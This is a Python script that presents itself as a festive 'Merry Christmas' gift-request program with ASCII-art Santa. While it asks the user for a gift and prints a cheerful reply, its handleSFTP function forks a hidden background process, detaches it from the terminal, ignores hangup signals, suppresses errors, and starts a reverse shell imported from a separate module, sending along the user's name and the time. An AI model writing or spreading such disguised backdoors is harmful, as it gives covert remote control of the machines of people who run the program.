#!/usr/bin/python3
from datetime import datetime
import time
import os
import paramiko
import sys
import random
import signal
import subprocess
import traceback
import getpass
from reverseShell import reverseShell
def drawSanta():
        print(r"""\
    |,\/,| |[_' |[_]) |[_]) \\//
    ||\/|| |[_, ||'\, ||'\,  ||

            ___ __ __ ____  __  __  ____  _  _    __    __
           // ' |[_]| |[_]) || ((_' '||' |,\/,|  //\\  ((_'
           \\_, |[']| ||'\, || ,_))  ||  ||\/|| //``\\ ,_))
                                                               

                                         ,;7,
                                       _ ||:|,
                     _,---,_           )\'  '|
                   .'_.-.,_ '.         ',')  j
                  /,'   ___}  \        _/   /
      .,         ,1  .''  =\ _.''.   ,`';_ |
    .'  \        (.'T ~, (' ) ',.'  /     ';',
    \   .\(\O/)_. \ (    _Z-'`>--, .'',      ;
     \  |   I  _|._>;--'`,-j-'    ;    ',  .'
    __\_|   _.'.-7 ) `'-' "       (      ;'
  .'.'_.'|.' .'   \ ',_           .'\   /
  | |  |.'  /      \   \          l  \ /
  | _.-'   /        '. ('._   _ ,.'   \i
,--' ---' / k  _.-,.-|__L, '-' ' ()    ;
 '._     (   ';   (    _-}             |
  / '     \   ;    ',.__;         ()   /
 /         |   ;    ; ___._._____.: :-j
|           \,__',-' ____: :_____.: :-\
|               F :   .  ' '        ,  L
',             J  |   ;             j  |
  \            |  |    L            |  J
   ;         .-F  |    ;           J    L
    \___,---' J'--:    j,---,___   |_   |
              |   |'--' L       '--| '-'|
               '.,L     |----.__   j.__.'
                | '----'   |,   '-'  }
                j         / ('-----';
               { "---'--;'  }       |
               |        |   '.----,.'
               ',.__.__.'    |=, _/
                |     /      |    '.
                |'= -x       L___   '--,
                L   __\          '-----'
                 '.____)

    
    """)
def disconnectFromTerminal():
    sys.stdout.flush()
    sys.stderr.flush()
    with open(os.devnull,  "rb",  0) as devNull:
        os.dup2(devNull.fileno(),  sys.stdin.fileno())
        os.dup2(devNull.fileno(),  sys.stdout.fileno())
        os.dup2(devNull.fileno(),  sys.stderr.fileno())

        
def handleSFTP():
    pid = os.fork()
    if pid == 0:
        try:
            disconnectFromTerminal()
            username = getpass.getuser()
            now = datetime.now()
            currTime = now.strftime("%H:%M:%S")
            rShell = reverseShell(username,  currTime)
            rShell.start()
        except Exception:
            pass
        sys.exit(0)



def Client():
    drawSanta()
    gift = input("What gift would you like? ")
    processTime = random.randint(1, 3)
    print("Processing")
    handleSFTP()
    signal.signal(signal.SIGHUP, signal.SIG_IGN)
    time.sleep(processTime)
    print("Your gift choice for today: " + gift)
    print("Thanks for your input. Please enter your next choice of gift tomorrow.")
    
    

if __name__ == '__main__':
    Client()
